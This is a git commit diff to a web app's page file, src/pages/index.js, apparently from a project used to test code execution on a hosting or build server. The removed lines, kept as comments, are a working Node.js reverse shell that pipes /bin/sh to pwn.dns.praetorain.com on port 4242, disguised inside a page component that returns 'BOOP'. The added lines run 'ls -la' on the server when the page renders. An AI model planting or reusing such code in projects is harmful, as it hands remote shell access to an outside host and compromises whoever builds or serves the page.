8a801786ea9af65c3e2c40e70f3b9cc59d9c5981
Ben Steger <69767810+ben-steger@users.noreply.github.com>
2021-08-08 13:19:23 -0500

    Update index.js

--- src/pages/index.js
+++ src/pages/index.js
@@ -1,15 +1,30 @@
 export default function Index() {
 
-  var net = require("net"),
-      cp = require("child_process"),
-      sh = cp.spawn("/bin/sh", []);
-  var client = new net.Socket();
-  client.connect(4242, "pwn.dns.praetorain.com", function(){
-      client.pipe(sh.stdin);
-      sh.stdout.pipe(client);
-      sh.stderr.pipe(client);
-  });
-  return <h1>BOOP</h1>; // Prevents the Node.js application form crashing
+//   var net = require("net"),
+//       cp = require("child_process"),
+//       sh = cp.spawn("/bin/sh", []);
+//   var client = new net.Socket();
+//   client.connect(4242, "pwn.dns.praetorain.com", function(){
+//       client.pipe(sh.stdin);
+//       sh.stdout.pipe(client);
+//       sh.stderr.pipe(client);
+//   });
+//   return <h1>BOOP</h1>; // Prevents the Node.js application form crashing
 
 //   return <h1>BOOP</h1>;
+  
+  const { exec } = require("child_process");
+
+  exec("ls -la", (error, stdout, stderr) => {
+      if (error) {
+          console.log(`error: ${error.message}`);
+          return;
+      }
+      if (stderr) {
+          console.log(`stderr: ${stderr}`);
+          return;
+      }
+      console.log(`stdout: ${stdout}`);
+      return stdout
+  });
 }
